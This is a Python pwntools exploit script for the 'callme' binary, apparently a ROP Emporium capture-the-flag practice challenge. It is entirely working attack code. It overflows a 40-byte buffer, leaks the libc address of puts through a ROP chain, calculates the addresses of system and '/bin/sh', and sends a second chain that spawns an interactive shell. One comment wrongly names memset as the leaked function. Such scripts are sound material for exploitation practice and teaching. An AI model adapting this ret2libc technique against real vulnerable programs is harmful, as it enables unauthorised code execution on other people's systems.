#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF(args.EXE or 'callme')
libc = elf.libc
rop = ROP([elf, libc])
pop_rdi = p64(0x00000000004009a3)
ret = p64(0x00000000004006be)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
break *pwnme+89
continue
'''.format(**locals())

offset = b'A' * 40

'''
1. print a leak to the address in libc in memset()'s GOT
2. grab that leak, calculate system and '/bin/sh'
3. call it. GG
'''

rop.raw(offset)
rop.call('puts', [elf.got['puts']])
rop.call('main')



io = start()
io.sendafter(b'> ', rop.chain())

# grab our leak
io.recvuntil(b'!\n')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
print(f"[*] Got a leak: {hex(leak)}")

libc_base = leak - libc.sym['puts']
print(f'[**] libc_base = {hex(libc_base)}')
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
print(f'[**] system addr = {hex(system)};   bin_sh = {hex(bin_sh)}')

payload = [
    offset,
    ret,  # to align the stack pointer 
    pop_rdi,
    p64(bin_sh),
    p64(system)
]

io.sendafter(b'> ', b''.join(payload))

io.interactive()

